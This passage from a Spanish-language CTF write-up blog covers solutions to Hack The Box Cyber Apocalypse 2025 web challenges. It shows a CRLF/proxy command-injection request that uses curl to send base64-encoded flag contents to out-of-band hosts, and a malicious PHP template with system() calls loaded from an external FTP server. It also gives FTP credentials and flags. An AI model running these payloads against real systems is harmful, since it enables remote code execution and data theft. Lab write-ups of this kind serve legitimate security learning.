    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Location: ../?error=Hey </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s">, watch it!</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Type: text/html</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">()</span>
</pre></table></code></div></div><p>Se observa que se intenta validar target con ip_address() de la librería ipaddress de Python, para asegurarse de que sea una IP válida, podemos inyectar comandos usando $, ya que Apache está ejecutando el CGI, entonces la inyección se da antes siquiera de que se llegue al código Python. Solo basta con proporcionar una IP valida, ya sea ipv4 o ipv6.</p><p>Usaremos en este caso una ipv6 y el caracter especial $ para ejecutar comandos:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>::1%<span class="si">$(</span><span class="nb">command</span><span class="si">)</span>
</pre></table></code></div></div><p>Nuestro payload completo se traduce a:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">GET</span> <span class="o">/</span><span class="nx">cgi</span><span class="o">-</span><span class="nx">bin</span><span class="o">/</span><span class="nx">attack</span><span class="o">-</span><span class="nx">domain</span><span class="p">?</span><span class="nx">target</span><span class="o">=-&amp;</span><span class="nx">name</span><span class="o">=</span><span class="nx">a</span><span class="o">%</span><span class="mi">0</span><span class="nx">d</span><span class="o">%</span><span class="mi">0</span><span class="nx">aLocation</span><span class="p">:</span><span class="o">+</span><span class="sr">/a%0d%0aContent-Type:+proxy:http:/</span><span class="o">/</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="o">/</span><span class="nx">cgi</span><span class="o">-</span><span class="nx">bin</span><span class="o">/</span><span class="nx">attack</span><span class="o">-</span><span class="nx">ip</span><span class="o">%</span><span class="mi">3</span><span class="nx">ftarget</span><span class="o">=</span><span class="p">::</span><span class="mi">1</span><span class="o">%</span><span class="nf">$</span><span class="p">(</span><span class="nx">curl</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="nx">aqsmhrfmvylkqdnuqyqqpqvhktneu42h2</span><span class="p">.</span><span class="nx">oast</span><span class="p">.</span><span class="nx">fun</span><span class="p">?</span><span class="nx">testt</span><span class="p">)</span><span class="o">%</span><span class="mi">260</span><span class="nx">name</span><span class="o">=%</span><span class="mi">0</span><span class="nx">D</span><span class="o">%</span><span class="mi">0</span><span class="nx">A</span><span class="o">%</span><span class="mi">0</span><span class="nx">D</span><span class="o">%</span><span class="mi">0</span><span class="nx">A</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-15.png" alt="alt text" data-proofer-ignore></p><p>El cual hace una simple petición a mi webhook para validar si funciona.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-16.png" alt="alt text" data-proofer-ignore></p><p>Se observa que si funciona, otro incoveniente ahora es que no se puede usar / en el comando, entonces para listar y navegar por directorios tuve que usar un poco de ingenio.</p><p>En vez de realizar</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cd</span> ../../../ | <span class="nb">base64</span> <span class="nt">-w0</span>
</pre></table></code></div></div><p>Tuve que realizar el siguiente, dado que este comando no tiene el caracter ‘/’ y no rompe la sintaxis de una url.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'cd ..;cd ..;cd ..; ls'</span>|sh| <span class="nb">base64</span> <span class="nt">-w0</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-8.png" alt="listfiles" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'cd ..;cd ..;cd ..; cat flag-jqpeei2a5jk8hr8.txt'</span>|sh| <span class="nb">base64</span> <span class="nt">-w0</span>
</pre></table></code></div></div><p>Como payload final para leer la flag usé Burp Collaborator para decodear a la vez de base64.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">GET</span> <span class="o">/</span><span class="nx">cgi</span><span class="o">-</span><span class="nx">bin</span><span class="o">/</span><span class="nx">attack</span><span class="o">-</span><span class="nx">domain</span><span class="p">?</span><span class="nx">target</span><span class="o">=-&amp;</span><span class="nx">name</span><span class="o">=</span><span class="nx">a</span><span class="o">%</span><span class="mi">0</span><span class="nx">d</span><span class="o">%</span><span class="mi">0</span><span class="nx">aLocation</span><span class="p">:</span><span class="o">+</span><span class="sr">/a%0d%0aContent-Type:+proxy:http:/</span><span class="o">/</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="o">/</span><span class="nx">cgi</span><span class="o">-</span><span class="nx">bin</span><span class="o">/</span><span class="nx">attack</span><span class="o">-</span><span class="nx">ip</span><span class="o">%</span><span class="mi">3</span><span class="nx">ftarget</span><span class="o">=</span><span class="p">::</span><span class="mi">1</span><span class="o">%</span><span class="nf">$</span><span class="p">(</span><span class="nx">curl</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="nx">cfvekttb0yhbc2ia84d9zkasqjwak68v</span><span class="p">.</span><span class="nx">oastify</span><span class="p">.</span><span class="nx">com</span><span class="p">?</span><span class="nx">p</span><span class="o">=</span><span class="nf">$</span><span class="p">(</span><span class="nx">echo</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">%</span><span class="mi">27</span><span class="nx">cd</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="p">..</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">62</span><span class="nx">cd</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="p">..</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">62</span><span class="nx">cd</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="p">..</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">33</span><span class="o">%</span><span class="mi">62</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="nx">cat</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">*</span><span class="p">.</span><span class="nx">txt</span><span class="o">%</span><span class="mi">27</span><span class="o">|</span><span class="nx">sh</span><span class="o">|%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="nx">base64</span><span class="o">%</span><span class="mi">25</span><span class="o">%</span><span class="mi">32</span><span class="o">%</span><span class="mi">30</span><span class="o">-</span><span class="nx">w0</span><span class="p">))</span><span class="o">%</span><span class="mi">260</span><span class="nx">name</span><span class="o">=%</span><span class="mi">0</span><span class="nx">D</span><span class="o">%</span><span class="mi">0</span><span class="nx">A</span><span class="o">%</span><span class="mi">0</span><span class="nx">D</span><span class="o">%</span><span class="mi">0</span><span class="nx">A</span> 
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-7.png" alt="Collabflag" data-proofer-ignore></p><p>Get the flag. 🎉 HTB{h4ndl1n6_m4l4k4r5_f0rc35}</p><h1 id="eldoria-panel">Eldoria Panel</h1><p>Es una web que muestra misiones que pueden ser asignadas con la funcion “claim quest”.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-20.png" alt="" data-proofer-ignore></p><p>Code Review:</p><p>La flag se encuentra en el directorio raiz con un nombre random gracias a esta linea en el entry.sh.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">mv</span> /flag.txt /flag<span class="si">$(</span><span class="nb">cat</span> /dev/urandom | <span class="nb">tr</span> <span class="nt">-cd</span> <span class="s2">"a-f0-9"</span> | <span class="nb">head</span> <span class="nt">-c</span> 10<span class="si">)</span>.txt -&gt; RCE
</pre></table></code></div></div><p>Toda página es retornada usando <code class="language-plaintext highlighter-rouge">render</code>.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$app</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/dashboard'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">,</span> <span class="kt">Response</span> <span class="nv">$response</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$html</span> <span class="o">=</span> <span class="nf">render</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'settings'</span><span class="p">][</span><span class="s1">'templatesPath'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'/dashboard.php'</span><span class="p">);</span>
    <span class="nv">$response</span><span class="o">-&gt;</span><span class="nf">getBody</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">write</span><span class="p">(</span><span class="nv">$html</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$response</span><span class="p">;</span>
<span class="p">})</span><span class="o">-&gt;</span><span class="nf">add</span><span class="p">(</span><span class="nv">$authMiddleware</span><span class="p">);</span>
</pre></table></code></div></div><p>La funcion render es vulnerable a RCE por el uso de la funcion eval, pero está usando file_exists antes de llamar a file_get_contents. Es posible setear la ruta de los templates llamanda a /api/admin/appSettings</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$app</span><span class="o">-&gt;</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/api/admin/appSettings'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">,</span> <span class="kt">Response</span> <span class="nv">$response</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">getBody</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">getContents</span><span class="p">(),</span> <span class="kc">true</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
		<span class="nv">$result</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'status'</span> <span class="o">=&gt;</span> <span class="s1">'error'</span><span class="p">,</span> <span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'No settings provided'</span><span class="p">];</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nv">$pdo</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'db'</span><span class="p">);</span>
		<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO app_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value"</span><span class="p">);</span>
		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
			<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">([</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">]);</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'template_path'</span><span class="p">]))</span> <span class="p">{</span>
			<span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'settings'</span><span class="p">][</span><span class="s1">'templatesPath'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'template_path'</span><span class="p">];</span>
		<span class="p">}</span>
		<span class="nv">$result</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'status'</span> <span class="o">=&gt;</span> <span class="s1">'success'</span><span class="p">,</span> <span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'Settings updated'</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="nv">$response</span><span class="o">-&gt;</span><span class="nf">getBody</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">write</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
	<span class="k">return</span> <span class="nv">$response</span><span class="o">-&gt;</span><span class="nf">withHeader</span><span class="p">(</span><span class="s1">'Content-Type'</span><span class="p">,</span> <span class="s1">'application/json'</span><span class="p">);</span>
<span class="p">})</span><span class="o">-&gt;</span><span class="nf">add</span><span class="p">(</span><span class="nv">$adminApiKeyMiddleware</span><span class="p">);</span>
</pre></table></code></div></div><p>El middleware es inútil porque llama a $handler-&gt;handle($request); independientemente -&gt; cada usuario puede llamar a rutas própias de admin.</p><p>Como no podemos escribir archivos en el servidor, usaremos el servicio ftp, ya que sirve con file_exsists y file_get_contents.</p><p>Levantaremos un servidor ftp donde hostearemos nuestro archivo template llamado dashboard.php, usaré este servicio gratuito online para levantar mi servidor ftp: <a href="https://sftpcloud.io/tools/free-ftp-server">Free FTP Server</a></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-21.png" alt="alt text" data-proofer-ignore></p><p>Creamos nuestro archivo template malicioso llamado dashboard.php, este contiene dos comandos para listar archivos y otro para leer la flag.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s2">"ls -la /flag*"</span><span class="p">);</span>
<span class="nb">system</span><span class="p">(</span><span class="s2">"cat /flag*"</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Se sube el archivo usando put dashboard.php</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-17.png" alt="" data-proofer-ignore></p><p>Seteamos la ruta de los templates haciendo un POST request a /api/admin/appSettings con el siguiente body:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"template_path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ftp://da192e7de042469196ddc45e20c9eb88:i2rMACU1fteQbrIEqh3zAqdNezrtTpKH@eu-central-1.sftpcloud.io"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-18.png" alt="alt text" data-proofer-ignore></p><p>Hacemos una solicitud a dashboard.php para que cargue nuestro archivo malicioso y se ejecuten los comandos.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-19.png" alt="alt text" data-proofer-ignore></p><p>Se obtiene la flag. 🎉</p><p>HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_5f8e78373f521bac3069c1e39d487581}</p><h1 id="eldoria-realms">Eldoria Realms</h1><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-22.png" alt="alt text" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-24.png" alt="alt text" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-25.png" alt="alt text" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-23.png" alt="alt text" data-proofer-ignore></p><p>HTB{p0llut3_4nd_h1t_pr0toc0lz_w_4_sw1tch_d730bc90109dcd38663a32b93f3ac999}</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb-writeups/'>HTB Writeups</a>, <a href='/categories/cyber-apocalypse-ctf/'>Cyber Apocalypse CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >Writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/web/" class="post-tag no-text-decoration" >Web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cyber+Apocalypse+2025+-+6x+Web+Challenges+Writeup+-+s4yhii%27s+Blog&url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FCyberApocalypse-CTF2025-Web%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cyber+Apocalypse+2025+-+6x+Web+Challenges+Writeup+-+s4yhii%27s+Blog&u=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FCyberApocalypse-CTF2025-Web%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FCyberApocalypse-CTF2025-Web%2F&text=Cyber+Apocalypse+2025+-+6x+Web+Challenges+Writeup+-+s4yhii%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tickets-popcorn-please/">Tickets and Popcorn please!, The Day main.js Became the Key Vault</a><li><a href="/posts/CyberApocalypse-CTF2025-Web/">Cyber Apocalypse 2025 - 6x Web Challenges Writeup</a><li><a href="/posts/CyberApocalypse-CTF2024-Web/">Cyber Apocalypse 2024 - 4x Web Challenges Writeup</a><li><a href="/posts/Web-Cache-Poisoning/">Web Cache Poisoning Techniques</a><li><a href="/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/">Cyber Apocalypse 2023 2x Web Challenges Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Tickets-popcorn-please/"><div class="card-body"> <em class="small" data-ts="1756126800" data-df="ll" > Aug 25, 2025 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tickets and Popcorn please!, The Day main.js Became the Key Vault</h3><div class="text-muted small"><p> Disclaimer This blog post is shared for educational and academic purposes only. All issues described here were responsibly reported to the affected company and have since been fixed and verified. P...</p></div></div></a></div><div class="card"> <a href="/posts/Cross-Site-Scripting-(XSS)/"><div class="card-body"> <em class="small" data-ts="1652889600" data-df="ll" > May 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cross Site Scripting (XSS)</h3><div class="text-muted small"><p> Cross-site scripting known as XSS is a web vulnerability in which malicious scripts are injected int benign and trusted websites. XSS occur when an attacker send malicious code in any user input fi...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/"><div class="card-body"> <em class="small" data-ts="1652889600" data-df="ll" > May 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber Apocalypse 2023 2x Web Challenges Writeup</h3><div class="text-muted small"><p> Kryptos Support Checking the web page of this challenge gives a form to send an issue and an admin will review that issue. So its interesting, maybe the admin will click in that issue and we can...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CyberApocalypse-CTF2024-Web/" class="btn btn-outline-primary" prompt="Older"><p>Cyber Apocalypse 2024 - 4x Web Challenges Writeup</p></a> <a href="/posts/Tickets-popcorn-please/" class="btn btn-outline-primary" prompt="Newer"><p>Tickets and Popcorn please!, The Day main.js Became the Key Vault</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "s4yhii/s4yhii.github.io", "data-repo-id": "R_kgDOHtsc-g", "data-category": "Announcements", "data-category-id": "DIC_kwDOHtsc-s4CQh10", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/s4yhii">Jesus Lujan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-V0V53P7YVQ"></script> <script> 